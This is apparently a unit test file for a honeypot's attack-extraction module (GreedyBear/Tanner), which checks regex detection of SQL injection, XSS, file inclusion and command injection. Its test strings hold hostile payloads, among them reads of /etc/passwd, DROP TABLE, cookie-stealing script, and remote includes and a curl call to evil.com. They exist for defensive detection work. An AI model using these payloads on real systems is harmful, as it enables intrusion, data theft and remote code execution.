from unittest.mock import Mock, patch

from greedybear.consts import PAYLOAD_REQUEST, SCANNER
from greedybear.cronjobs.extraction.strategies.tanner import (
    TANNER_ATTACK_PATTERNS,
    TANNER_HONEYPOT,
    TANNER_SOURCE,
    TannerExtractionStrategy,
)
from greedybear.models import Tag

from . import ExtractionTestCase


class TestTannerExtractionStrategy(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    # ------------------------------------------------------------------
    # Scanner extraction (reuses iocs_from_hits like all other strategies)
    # ------------------------------------------------------------------

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    def test_extracts_scanner_ips(self, mock_threatfox, mock_iocs_from_hits):
        mock_ioc = self._create_mock_ioc("1.2.3.4")
        mock_iocs_from_hits.return_value = [mock_ioc]
        self.strategy.ioc_processor.add_ioc = Mock(return_value=mock_ioc)

        hits = [{"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"}]
        self.strategy.extract_from_hits(hits)

        mock_iocs_from_hits.assert_called_once_with(hits)
        self.strategy.ioc_processor.add_ioc.assert_any_call(
            mock_ioc, attack_type=SCANNER, general_honeypot_name=TANNER_HONEYPOT
        )
        self.assertEqual(len(self.strategy.ioc_records), 1)
        mock_threatfox.assert_called_once()

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    def test_handles_none_ioc_record(self, mock_iocs_from_hits):
        mock_ioc = self._create_mock_ioc()
        mock_iocs_from_hits.return_value = [mock_ioc]
        self.strategy.ioc_processor.add_ioc = Mock(return_value=None)

        hits = [{"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"}]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(len(self.strategy.ioc_records), 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    def test_extracts_multiple_scanners(self, mock_threatfox, mock_iocs_from_hits):
        ioc1 = self._create_mock_ioc("1.2.3.4")
        ioc2 = self._create_mock_ioc("5.6.7.8")
        mock_iocs_from_hits.return_value = [ioc1, ioc2]
        self.strategy.ioc_processor.add_ioc = Mock(side_effect=[ioc1, ioc2])

        hits = [
            {"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"},
            {"src_ip": "5.6.7.8", "dest_port": 443, "@timestamp": "2025-01-01T00:00:00"},
        ]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(len(self.strategy.ioc_records), 2)


class TestTannerAttackDetection(ExtractionTestCase):
    """Test the regex-based attack classification engine."""

    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    # ------------------------------------------------------------------
    # _detect_attack_types
    # ------------------------------------------------------------------

    def test_detects_sqli_union_select(self):
        text = "/search?q=1 UNION SELECT username, password FROM users--"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_detects_sqli_or_bypass(self):
        text = "/login?user=admin' OR '1'='1"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_detects_sqli_sleep(self):
        text = "/page?id=1; SLEEP(5)--"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_detects_sqli_information_schema(self):
        text = "/page?id=1 UNION SELECT table_name FROM information_schema.tables"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_detects_xss_script_tag(self):
        text = "/comment?body=<script>alert('xss')</script>"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_detects_xss_event_handler(self):
        text = '/page?q=<img onerror=alert(1) src=x>'
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_detects_xss_javascript_protocol(self):
        text = "/redirect?url=javascript:alert(document.cookie)"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_detects_lfi_path_traversal(self):
        text = "/page?file=../../../etc/passwd"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_detects_lfi_proc_self(self):
        text = "/read?path=/proc/self/environ"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_detects_lfi_php_wrapper(self):
        text = "/include?page=php://filter/convert.base64-encode/resource=index.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_detects_rfi_include_url(self):
        text = "/page?file=include http://evil.com/shell.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("rfi", result)

    def test_detects_rfi_remote_php(self):
        text = "/page?file=http://evil.com/backdoor.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("rfi", result)

    def test_detects_cmd_injection_semicolon(self):
        text = "/ping?host=127.0.0.1; cat /etc/passwd"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_detects_cmd_injection_pipe(self):
        text = "/dns?host=example.com | id"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_detects_cmd_injection_backtick(self):
        text = "/page?name=`whoami`"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_detects_cmd_injection_dollar_paren(self):
        text = "/page?q=$(cat /etc/passwd)"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_detects_multiple_attack_types(self):
        """A single request can match multiple attack types."""
        text = "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)
        self.assertIn("xss", result)

    def test_no_attack_for_benign_request(self):
        text = "/index.html?page=about&lang=en"
        result = self.strategy._detect_attack_types(text)
        self.assertEqual(result, [])

    def test_no_attack_for_empty_text(self):
        result = self.strategy._detect_attack_types("")
        self.assertEqual(result, [])


class TestTannerRequestTextExtraction(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    def test_extracts_url_field(self):
        hit = {"url": "/search?q=test", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/search?q=test", text)

    def test_extracts_path_field(self):
        hit = {"path": "/api/data", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/api/data", text)

    def test_extracts_post_data(self):
        hit = {"url": "/login", "post_data": "user=admin&pass=test", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("user=admin&pass=test", text)

    def test_extracts_body_field(self):
        hit = {"url": "/api", "body": '{"key": "value"}', "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn('{"key": "value"}', text)

    def test_url_decoding(self):
        hit = {"url": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("<script>alert(1)</script>", text)

    def test_empty_hit(self):
        hit = {"src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertEqual(text, "")

    def test_url_preferred_over_path(self):
        hit = {"url": "/from-url", "path": "/from-path", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/from-url", text)


class TestTannerAttackClassification(ExtractionTestCase):
    """Test the full _classify_attacks flow with tag creation."""

    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_classify_creates_tags_for_sqli(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT * FROM users"}]
        self.strategy.extract_from_hits(hits)

        mock_tag_objects.get_or_create.assert_any_call(
            ioc=mock_ioc_record,
            key="attack_type",
            value="sqli",
            source=TANNER_SOURCE,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_classify_creates_multiple_tags(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"}]
        self.strategy.extract_from_hits(hits)

        tag_values = [call[1]["value"] for call in mock_tag_objects.get_or_create.call_args_list]
        self.assertIn("lfi", tag_values)
        self.assertIn("xss", tag_values)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_classify_skips_benign_requests(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        hits = [{"src_ip": "1.2.3.4", "url": "/index.html?page=about"}]
        self.strategy.extract_from_hits(hits)
        mock_tag_objects.get_or_create.assert_not_called()

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_classify_skips_hit_without_src_ip(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        hits = [{"url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)
        mock_tag_objects.get_or_create.assert_not_called()

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_classify_skips_unknown_scanner_ip(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        self.mock_ioc_repo.get_ioc_by_name.return_value = None
        hits = [{"src_ip": "9.9.9.9", "url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)
        mock_tag_objects.get_or_create.assert_not_called()

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_tag_counter_increments(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1; SLEEP(5)--"}]
        self.strategy.extract_from_hits(hits)

        self.assertGreater(self.strategy.attack_tags_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_duplicate_tag_not_counted(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        # get_or_create returns created=False for existing tag
        mock_tag_objects.get_or_create.return_value = (Mock(), False)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(self.strategy.attack_tags_added, 0)


class TestTannerRfiExtraction(ExtractionTestCase):
    """Test RFI hostname extraction as PAYLOAD_REQUEST IOCs."""

    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_creates_payload_request_ioc(self, mock_tag_objects, mock_threatfox, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record

        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        rfi_ioc_record = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc_record)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        # Verify PAYLOAD_REQUEST IOC was created for the RFI hostname
        payload_calls = [
            call
            for call in self.strategy.ioc_processor.add_ioc.call_args_list
            if call[1].get("attack_type") == PAYLOAD_REQUEST
        ]
        self.assertEqual(len(payload_calls), 1)
        self.assertEqual(payload_calls[0][0][0].name, "evil.com")
        self.assertEqual(payload_calls[0][1]["general_honeypot_name"], TANNER_HONEYPOT)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_links_scanner_to_hostname(self, mock_tag_objects, mock_threatfox, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        scanner_record = self._create_mock_ioc("1.2.3.4")
        hostname_record = self._create_mock_ioc("evil.com", ioc_type="domain")

        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner_record,
            "evil.com": hostname_record,
        }.get(name)

        mock_tag_objects.get_or_create.return_value = (Mock(), True)
        self.strategy.ioc_processor.add_ioc = Mock(return_value=hostname_record)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        # _add_fks should link both IOCs
        scanner_record.related_ioc.add.assert_called_with(hostname_record)
        hostname_record.related_ioc.add.assert_called_with(scanner_record)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_deduplicates_hostnames(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        # Two different URLs pointing to the same hostname
        hits = [
            {"src_ip": "1.2.3.4", "url": "/a?file=include http://evil.com/shell.php&b=include http://evil.com/backdoor.php"}
        ]
        self.strategy.extract_from_hits(hits)

        # add_ioc should be called only once for the hostname (deduplicated)
        payload_calls = [
            call
            for call in self.strategy.ioc_processor.add_ioc.call_args_list
            if call[1].get("attack_type") == PAYLOAD_REQUEST
        ]
        self.assertEqual(len(payload_calls), 1)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_counter_increments(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        self.assertGreater(self.strategy.rfi_hostnames_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_handles_invalid_url(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        self.strategy.ioc_processor.add_ioc = Mock(return_value=None)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http:///shell.php"}]
        self.strategy.extract_from_hits(hits)

        # Should not crash; RFI counter should stay 0 since hostname is empty
        self.assertEqual(self.strategy.rfi_hostnames_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
    def test_rfi_attaches_sensor(self, mock_tag_objects, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_tag_objects.get_or_create.return_value = (Mock(), True)

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        mock_sensor = Mock()
        mock_sensor.address = "10.0.0.1"

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php", "_sensor": mock_sensor}]
        self.strategy.extract_from_hits(hits)

        # Verify the IOC passed to add_ioc had the sensor attached
        call_args = self.strategy.ioc_processor.add_ioc.call_args_list
        payload_calls = [c for c in call_args if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        ioc_arg = payload_calls[0][0][0]
        self.assertEqual(ioc_arg._sensors_to_add, [mock_sensor])


class TestTannerAddFks(ExtractionTestCase):
    """Test bidirectional IOC linking for RFI."""

    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    def test_links_scanner_and_hostname(self):
        scanner = self._create_mock_ioc("1.2.3.4")
        hostname = self._create_mock_ioc("evil.com", ioc_type="domain")

        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner,
            "evil.com": hostname,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        scanner.related_ioc.add.assert_called_once_with(hostname)
        hostname.related_ioc.add.assert_called_once_with(scanner)
        self.assertEqual(self.mock_ioc_repo.save.call_count, 2)

    def test_skips_when_scanner_missing(self):
        hostname = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "evil.com": hostname,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        hostname.related_ioc.add.assert_not_called()

    def test_skips_when_hostname_missing(self):
        scanner = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        scanner.related_ioc.add.assert_not_called()


class TestTannerAttackPatterns(ExtractionTestCase):
    """
    Direct validation of TANNER_ATTACK_PATTERNS regexes.
    Ensures each pattern matches known attack payloads and does not
    false-positive on benign input.
    """

    # ---- SQLi ----
    def test_sqli_matches(self):
        sqli_payloads = [
            "1 UNION SELECT * FROM users",
            "admin' OR '1'='1",
            "1; DROP TABLE users",
            "1; SLEEP(5)",
            "CONCAT(username, password)",
            "1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
            "/* bypass */ 1=1",
        ]
        for payload in sqli_payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["sqli"].search(payload), f"SQLi missed: {payload}")

    def test_sqli_no_false_positive(self):
        benign = [
            "/about",
            "/users/123",
            "Hello world",
            "SELECT a nice day",
        ]
        for text in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["sqli"].search(text), f"SQLi false positive: {text}")

    # ---- XSS ----
    def test_xss_matches(self):
        xss_payloads = [
            "<script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            '<img onerror=alert(1) src=x>',
            '<svg onload=alert(1)>',
            "eval('malicious')",
            "document.write('xss')",
        ]
        for payload in xss_payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["xss"].search(payload), f"XSS missed: {payload}")

    def test_xss_no_false_positive(self):
        benign = [
            "/about",
            "Just a normal text with <b>bold</b>",
            "Buy scripts and novels",
        ]
        for text in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["xss"].search(text), f"XSS false positive: {text}")

    # ---- LFI ----
    def test_lfi_matches(self):
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//etc/shadow",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index",
            "data://text/plain;base64,PD9waHAgc3lzdGVtK",
            "expect://id",
        ]
        for payload in lfi_payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["lfi"].search(payload), f"LFI missed: {payload}")

    def test_lfi_no_false_positive(self):
        benign = [
            "/images/photo.jpg",
            "/api/v2/data",
            "normal filepath.txt",
        ]
        for text in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["lfi"].search(text), f"LFI false positive: {text}")

    # ---- RFI ----
    def test_rfi_matches(self):
        rfi_payloads = [
            "include http://evil.com/shell.php",
            "file=https://attacker.net/backdoor.txt",
            "require http://evil.com/payload.asp",
            "http://badsite.org/malware.cgi",
        ]
        for payload in rfi_payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["rfi"].search(payload), f"RFI missed: {payload}")

    def test_rfi_no_false_positive(self):
        benign = [
            "/about",
            "Visit our website",
            "file=report.pdf",
        ]
        for text in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["rfi"].search(text), f"RFI false positive: {text}")

    # ---- Command Injection ----
    def test_cmd_injection_matches(self):
        cmd_payloads = [
            "; cat /etc/passwd",
            "| id",
            "&& whoami",
            "`uname -a`",
            "$(curl http://evil.com)",
            "/bin/sh -c id",
            "> /tmp/output",
        ]
        for payload in cmd_payloads:
            self.assertIsNotNone(
                TANNER_ATTACK_PATTERNS["cmd_injection"].search(payload),
                f"CmdInj missed: {payload}",
            )

    def test_cmd_injection_no_false_positive(self):
        benign = [
            "/about",
            "Hello world",
            "normal text here",
            "price: $100",
        ]
        for text in benign:
            self.assertIsNone(
                TANNER_ATTACK_PATTERNS["cmd_injection"].search(text),
                f"CmdInj false positive: {text}",
            )
